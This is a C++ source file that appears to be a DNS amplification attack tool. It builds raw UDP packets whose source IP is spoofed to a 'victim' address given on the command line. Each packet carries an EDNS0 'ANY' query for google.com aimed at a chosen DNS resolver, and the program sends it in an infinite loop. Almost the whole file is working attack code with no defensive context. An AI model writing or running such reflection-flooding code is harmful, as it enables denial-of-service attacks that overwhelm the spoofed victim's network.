#include <arpa/inet.h>
#include <errno.h>
#include <iostream>
#include <linux/if_packet.h>
#include <net/if.h>
#include <netinet/if_ether.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
using namespace std;

// a fake header which helps calculating UDP checksum
struct pseudoHeader {
    u_int32_t srcIp;
    u_int32_t dstIp;
    u_int8_t placeHolder;
    u_int8_t protocol;
    u_int16_t udpLength;
};

// calculate checksum
unsigned short calCheck(unsigned short *p, int cnt) {
    unsigned long ret = 0;
    // add 2 bytes value everytime
    while (cnt > 1) {
        ret += *p;
        *p++;
        cnt -= 2;
    }
    if (cnt > 0)
        ret += *(unsigned char *)p;
    // if ret is bigger than 16 bits value, add the overflow part to lower 16 bits
    while (ret >> 16)
        ret = (ret >> 16) + (ret & 0xffff);
    return (unsigned short)(~ret);
}

signed main(int argc, char *argv[]) {
    // create socket
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if (s == -1) {
        cerr << "Failed to create socket\n";
        return 1;
    } else
        cout << "Success to create socket\n";

    // set IP_HDRINCL to create my own IP header
    int one = 1;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        cerr << "Fail to Set IP_HDRINCL\n";
        return 1;
    } else
        cout << "Success to set IP_HDRINCL\n";

    char datagram[4096], *data;
    memset(datagram, 0, sizeof(datagram));
    struct iphdr *iph = (struct iphdr *)datagram;
    struct udphdr *udph = (struct udphdr *)(datagram + sizeof(struct iphdr));
    data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);

    int dnsLen = 28 + 11;
    // ID: 0x73bb
    // query domain: google.com
    // type: any
    // class: IN
    // use opt 41 to open edns0
    char buf[] = "\x73\xbb\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\xff\x00\x01\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x00";
    for (int i = 0; i < dnsLen; i++)
        *(data + i) = buf[i];

    // dst/dns IP
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(80);
    sin.sin_addr.s_addr = inet_addr(argv[3]);

    // src/victim IP
    char sourceIp[32];
    strcpy(sourceIp, argv[1]);

    // IP header
    iph->version = 4;
    iph->ihl = 5;
    iph->tos = 16;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + dnsLen;
    iph->id = htonl(54321);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    iph->saddr = inet_addr(sourceIp);
    iph->daddr = sin.sin_addr.s_addr;

    iph->check = calCheck((unsigned short *)datagram, iph->tot_len);

    // UDP header
    udph->source = htons(atoi(argv[2]));
    udph->dest = htons(53);
    udph->len = htons(sizeof(udphdr) + dnsLen);
    udph->check = 0;

    struct pseudoHeader psh;
    psh.srcIp = inet_addr(sourceIp);
    psh.dstIp = sin.sin_addr.s_addr;
    psh.placeHolder = 0;
    psh.protocol = IPPROTO_UDP;
    psh.udpLength = htons(sizeof(struct udphdr) + dnsLen);

    char *pseudoGram;
    int pSize = sizeof(struct pseudoHeader) + sizeof(struct udphdr) + dnsLen;
    pseudoGram = (char *)malloc(pSize);
    memcpy(pseudoGram, (char *)&psh, sizeof(struct pseudoHeader));
    memcpy(pseudoGram + sizeof(struct pseudoHeader), udph, sizeof(struct udphdr) + dnsLen);

    udph->check = calCheck((unsigned short *)pseudoGram, pSize);

    while (1)
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));

    return 0;
}
